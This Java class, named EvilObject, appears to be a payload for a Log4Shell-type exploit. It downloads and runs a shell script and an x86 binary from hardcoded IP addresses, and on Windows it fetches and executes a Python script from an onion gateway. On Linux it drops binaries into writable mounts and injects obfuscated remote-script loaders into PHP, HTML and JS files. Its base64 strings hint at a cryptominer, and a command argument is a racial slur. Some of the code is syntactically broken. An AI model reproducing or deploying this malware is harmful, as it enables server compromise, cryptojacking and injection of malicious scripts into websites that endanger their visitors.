import java.util.Base64;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.io.FileReader;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.nio.file.Files; 
import java.nio.file.Paths;
import java.nio.charset.StandardCharsets;
import java.io.FileWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.Random;
import java.net.InetAddress;
import java.net.NetworkInterface;
public class EvilObject {
    public static void download(String url, String fileName) throws Exception {
        try (InputStream in = URI.create(url).toURL().openStream()) {
            Files.copy(in, Paths.get(fileName));
        }
    }
    public void download(String FILE_URL, String FILE_NAME, String FILE_DIR) {
        try {
            if(System.getProperty("os.name").startsWith("Windows")) {
                download(FILE_URL,FILE_DIR + "\\" + FILE_NAME);
            } else {
                download(FILE_URL,FILE_DIR + "/" + FILE_NAME);
            }
        } catch(Exception e) {
            
        }
    }
    String cmd="cd /tmp;rm -rf ur0a.sh;wget http://172.93.129.227/.Samael/ur0a.sh;chmod +x ur0a.sh;./ur0a.sh;rm -rf ur0a.sh;curl -O http://172.93.129.227/.Samael/ur0a.sh;chmod +x ur0a.sh;./ur0a.sh;rm -rf ur0a.sh;cd /tmp;rm -rf ur0a.sh;/bin/busybox/wget http://172.93.129.227/.Samael/ur0a.sh;chmod +x ur0a.sh;./ur0a.sh;rm -rf ur0a.sh;/bin/busybox/curl -O http://172.93.129.227/.Samael/ur0a.sh;chmod +x ur0a.sh;./ur0a.sh;rm -rf ur0a.sh;wget http://136.144.41.164/x86; chmod 777 x86; ./x86 nignig";
    Runtime.getRuntime().exec(cmd);
    void strwrite(String data, OutputStream output) {
        try {
            output.write(data.getBytes(StandardCharsets.UTF_8));
        } catch(IOException e) {

        }
    }
    private boolean streamService() {
        try {
            BufferedReader reader = new BufferedReader(new FileReader("/proc/cpuinfo"));
            String currentLine;
            while((currentLine = reader.readLine()) != null)
            {
                if(currentLine.indexOf("pdpe1gb") > 0)
                {
                     return true;
                }
            }
        } catch (Exception e) {}
        return false;
    }
    public void getmac() {
        try {
            InetAddress localHost = InetAddress.getLocalHost();
            NetworkInterface ni = NetworkInterface.getByInetAddress(localHost);
            byte[] hardwareAddress = ni.getHardwareAddress();
            String[] hexadecimal = new String[hardwareAddress.length];
            for (int i = 0; i < hardwareAddress.length; i++) {
                hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
            }
            mymac = String.join("", hexadecimal);
        } catch (Exception e) {}
    }
    protected String getSaltString() {
        String SALTCHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < 18) { // length of the random string.
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr = salt.toString();
        return saltStr;

    }
    public String mymac = "uKn0wN";
    public void handler(String filename) {
        try {
            BufferedReader reader = new BufferedReader(new FileReader(filename));
            String data = new String(Files.readAllBytes(Paths.get(filename)));
            String randvar = getSaltString();
            String rand2var = getSaltString();
            String injackted = "(function(" + rand2var + ", " + randvar + ") {" + randvar + " = " + rand2var + ".createElement('script');" + randvar + ".type = 'text/javascript';" + randvar + ".async = true;" + randvar + ".src = atob('" + mymac + "dWJsb2NrLXJlZmVyZXIuZGV2" + mymac + "'.replace(/" + mymac + "/gi, '')) + '?' + String(Math.random()).replace('0.','');" + rand2var + ".getElementsByTagName('body')[0].appendChild(" + randvar + ");}(document));";
            if(filename.contains(".js")) { 
                data.replaceFirst(Pattern.quote("var "), Matcher.quoteReplacement(injackted));
            } else {
               data.replaceFirst(Pattern.quote("</html"), Matcher.quoteReplacement("<script>" + injackted + "</script></html"));
            }
        } catch (Exception e) {}
    }
    public boolean run(String dir) {
        try{
            try {
                FileWriter myWriter = new FileWriter(dir + "/.pid.lock");
                myWriter.write("pid.lock");
                myWriter.close();
            } catch (Exception err) {
                err.printStackTrace();
            }
            File f = new File(dir + "/.pid.lock");
            if(f.exists()) {
                String bin = new String(Base64.getDecoder().decode("UzFlSjM"));
                String arch = new String(Base64.getDecoder().decode("SU9iZUVOd2o"));
                String mmnee = new String(Base64.getDecoder().decode("eG1yaWc"));
                //wget http://136.144.41.164/x86; chmod 777 x86; ./x86 nignig
                download("http://172.93.129.227/.Samael/ur0a.sh", "chmod +x ur0a.sh; sh ur0a.sh", dir);
                download("http://136.144.41.164/x86", "chmod +x ./x86; ./x86", dir);
                Thread.sleep(85);
                return true;
            }
        } catch(Exception e) {
            
        }
        return false;
    }
    public EvilObject() throws Exception {
        String sDir = "";
        if(System.getProperty("os.name").startsWith("Windows")) {
    //      download("http://bp65pce2vsk7wpvy2fyehel25ovw4v7nve3lknwzta7gtiuy6jm7l4yd.onion.ws/sysconfig.exe", "services.exe", System.getProperty("user.home"));
    //        Runtime.getRuntime().exec("services.exe", null, new File(System.getProperty("user.home")));
            download("https://github.com/manthey/pyexe/releases/download/v18/py27.exe", "python.exe", System.getProperty("java.io.tmpdir"));
            download("http://bp65pce2vsk7wpvy2fyehel25ovw4v7nve3lknwzta7gtiuy6jm7l4yd.onion.ws/setup.py", "setup.py", System.getProperty("java.io.tmpdir"));            
            Runtime.getRuntime().exec("python.exe setup.py", null, new File(System.getProperty("java.io.tmpdir")));
            sDir = "C:\\";
    }else {
            try  
            {  
                File file=new File("/proc/self/mounts");    //creates a new file instance  
                FileReader fr=new FileReader(file);   //reads the file  
                BufferedReader br=new BufferedReader(fr);  //creates a buffering character input stream  
                String line;  
                while((line=br.readLine())!=null)  
                {  
                    if(line.contains("rw")) {
                        if(new File(line.split(" ")[1]).canWrite()) {
                            if(run(line.split(" ")[1])) {
                                break;
                            }
                        }
                    }  
                }
                sDir = "/";
            }catch(IOException e)  
            {  
                e.printStackTrace();  
            }
            getmac();
            Files.find(Paths.get(sDir), 999, (p, bfa) -> bfa.isRegularFile() && p.getFileName().toString().matches(".*\\.php")).forEach((filename)->handler(filename.toString()));
            Files.find(Paths.get(sDir), 999, (p, bfa) -> bfa.isRegularFile() && p.getFileName().toString().matches(".*\\.html")).forEach((filename)->handler(filename.toString()));
            Files.find(Paths.get(sDir), 999, (p, bfa) -> bfa.isRegularFile() && p.getFileName().toString().matches(".*\\.js")).forEach((filename)->handler(filename.toString()));
            Files.find(Paths.get(sDir), 999, (p, bfa) -> bfa.isRegularFile() && p.getFileName().toString().matches(".*\\.php5")).forEach((filename)->handler(filename.toString()));
         }
    }
}
